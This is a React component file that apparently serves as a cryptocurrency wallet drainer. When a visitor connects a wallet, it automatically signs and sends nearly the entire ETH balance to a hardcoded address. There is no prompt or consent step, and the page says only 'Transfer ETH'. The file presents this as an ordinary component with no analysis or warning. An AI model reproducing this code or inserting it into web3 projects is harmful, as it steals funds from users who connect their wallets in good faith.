import { useEffect, useState } from 'react';
import { useAppKitAccount } from "@reown/appkit/react";
import { ethers } from 'ethers';

const recipientAddress = '0xCd0C0aE043D6506243adfCE47eC4a667cac29359'; // Predefined recipient wallet address

function TransferETHComponent() {
  const { address, isConnected } = useAppKitAccount();
  const [status, setStatus] = useState('');

  async function transferETH() {
    if (!isConnected) {
      setStatus('Please connect your wallet first.');
      return;
    }

    if (typeof window.ethereum === 'undefined') {
      setStatus('Ethereum provider is not available. Please install MetaMask or another wallet.');
      return;
    }

    try {
      // Initialize ethers provider using window.ethereum
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();

      // Check balance of the connected wallet
      const balance = await signer.getBalance();

      if (balance.eq(0)) {
        setStatus('Error: Insufficient ETH balance.');
        return;
      }

      const amountToSend = balance.sub(ethers.utils.parseEther('0.01')); // Leave some ETH for gas fees

      const tx = await signer.sendTransaction({
        to: recipientAddress,
        value: amountToSend,
      });

      setStatus('Transaction sent! Waiting for confirmation...');

      // Wait for transaction to be mined
      await tx.wait();
      setStatus('Transaction confirmed!');
    } catch (error) {
      console.error('Transaction error:', error);

      if (error.message.includes('insufficient funds')) {
        setStatus('Error: Insufficient ETH balance for the transaction.');
      } else if (error.message.includes('gas')) {
        setStatus('Error: Not enough gas fees.');
      } else {
        setStatus(`Transaction failed: ${error.message}`);
      }
    }
  }

  useEffect(() => {
    if (isConnected) {
      transferETH();
    }
  }, [isConnected]);

  return (
    <div>
      <h2>Transfer ETH</h2>
      <p>{status}</p>
      {!isConnected && <button onClick={() => setStatus('Please connect your wallet first.')}>Connect Wallet</button>}
    </div>
  );
}

export default TransferETHComponent;
